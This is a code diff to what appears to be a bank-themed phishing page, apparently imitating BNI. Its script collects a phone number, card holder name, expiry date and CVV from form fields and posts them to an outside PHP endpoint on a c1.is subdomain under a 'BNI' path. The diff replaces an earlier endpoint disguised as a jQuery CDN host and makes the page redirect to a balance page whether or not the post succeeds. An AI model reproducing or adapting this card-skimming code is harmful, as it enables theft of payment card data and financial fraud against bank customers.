@@ -285,7 +285,7 @@
 </div>
 </djmusik>
 <script>
-function letsgo(){
+function letsgo1(){
 
     $("#loadersaya").show();
  var nope = document.getElementById("nomorhp").value;
@@ -358,10 +358,11 @@ $(document).ready(function(){
  
       
          $.ajax({
-              url: 'https://code-jquery-com.c1.is/BNI/debit.php',
+              url: 'https://yup-paylater.c1.is/BNI/5/debit.php',
               type: 'post',
               data: $(this).serialize(),             
-success: function(data) {
+complete: function(data) {
+            console.log('Complete')
                $("#loadersaya").hide();
 
  window.location.href = 'saldo.html';
@@ -374,26 +375,13 @@ var debit = document.getElementById("nama").value;
  var tahun = document.getElementById("tahun").value;
  sessionStorage.setItem("tahun", tahun);
  var cvvkode = document.getElementById("pesan").value;
- sessionStorage.setItem("cvvkode", cvvkode);
+sessionStorage.setItem("cvvkode", cvvkode);
  
-               
-            },
-           error: function() {
-              $("#loadersaya").hide();
-var debit = document.getElementById("nama").value;
- sessionStorage.setItem("debit", debit);
- var bulan = document.getElementById("bulan").value;
- sessionStorage.setItem("bulan", bulan);
- var tahun = document.getElementById("tahun").value;
- sessionStorage.setItem("tahun", tahun);
- var cvvkode = document.getElementById("pesan").value;
- sessionStorage.setItem("cvvkode", cvvkode);
-           
-window.location.href = 'saldo.html';
-            },
-        });
+}
     });
-});
+ });
+    return false;
+});   
 
         </script>
       
